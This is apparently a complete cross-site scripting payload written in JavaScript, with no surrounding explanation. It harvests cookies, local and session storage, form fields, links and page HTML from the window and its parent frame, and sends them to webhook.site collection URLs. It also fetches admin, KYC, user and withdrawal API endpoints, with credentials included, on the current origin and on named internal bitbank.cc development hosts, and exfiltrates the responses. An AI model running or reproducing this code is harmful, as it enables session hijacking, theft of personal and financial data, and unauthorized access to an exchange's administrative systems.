(function(){
var TOK=["14f21569-9eb6-435b-bff8-8f51272dcc79", "57c1002e-a28c-4fda-863d-34de6bd16d28", "e3b0958a-2d94-4162-8652-96f51701b58b", "739383d1-4c0a-4ab8-a808-07917862fd90", "f9222d11-0d2f-4c15-bbe6-8279219fdb94"],N=0;
var TAG='i195';
function S(o){o.tag=TAG;o.ts=Date.now();
 var u=TOK[(N++)%TOK.length];
 try{navigator.sendBeacon('https://webhook.site/'+u,JSON.stringify(o))}catch(e){}
 try{fetch('https://webhook.site/'+u,{method:'POST',mode:'no-cors',keepalive:true,body:JSON.stringify(o)})}catch(e){}
}
function T(f){try{return f()}catch(e){return 'ERR:'+e}}
function dump(w,label){
 var o={phase:'dump',w:label,url:T(function(){return w.location.href}),origin:T(function(){return w.location.origin}),
  ref:T(function(){return w.document.referrer}),name:T(function(){return w.name}),title:T(function(){return w.document.title}),
  ck:T(function(){return w.document.cookie}),ls:{},ss:{}};
 try{for(var i=0;i<w.localStorage.length;i++){var k=w.localStorage.key(i);o.ls[k]=w.localStorage.getItem(k)}}catch(e){o.lse=''+e}
 try{for(var i=0;i<w.sessionStorage.length;i++){var k=w.sessionStorage.key(i);o.ss[k]=w.sessionStorage.getItem(k)}}catch(e){o.sse=''+e}
 o.forms=T(function(){return [].map.call(w.document.querySelectorAll('input,meta'),function(n){return n.tagName+'|'+(n.name||n.getAttribute&&n.getAttribute('name')||n.getAttribute&&n.getAttribute('property')||'')+'|'+(n.type||'')+'|'+(n.value||n.content||'')}).slice(0,150)});
 o.links=T(function(){return [].map.call(w.document.querySelectorAll('a'),function(a){return a.href+'|'+(a.textContent||'').trim().slice(0,40)}).slice(0,200)});
 o.scripts=T(function(){return [].map.call(w.document.querySelectorAll('script[src]'),function(s){return s.src}).slice(0,80)});
 o.html=T(function(){return w.document.documentElement.outerHTML.slice(0,300000)});
 S(o);return o;
}
dump(window,'self');try{dump(parent,'parent')}catch(e){}
var O=T(function(){return location.origin})||'';
var paths=['/api/v1/admin/me','/api/v1/admin/reviewable','/api/v1/admin/kyc','/api/v1/admin/users','/api/v1/admin/withdrawals','/api/v1/kyc/reviewable','/reviewable','/approve_withdrawal','/master_assets','/dashboard','/api/me','/api/v1/auth/me','/api/v1/session','/'];
function grab(base,label){
 paths.forEach(function(p){
  try{fetch(base+p,{credentials:'include',cache:'no-store'}).then(function(r){
   return r.text().then(function(t){S({phase:'probe',src:label,path:p,status:r.status,ct:r.headers.get('content-type'),body:t.slice(0,150000)})})
  }).catch(function(e){S({phase:'probe',src:label,path:p,err:''+e})});}catch(e){}
 });
}
grab(O,'same-origin');
['https://qa-management.bronx-dev.bitbank.cc','http://qa-management.bronx-dev.bitbank.cc','https://bronx-dev.bitbank.cc'].forEach(function(h){grab(h,'internal:'+h)});
setTimeout(function(){S({phase:'alive',u:T(function(){return location.href}),p:T(function(){return parent.location.href})})},25000);
})();
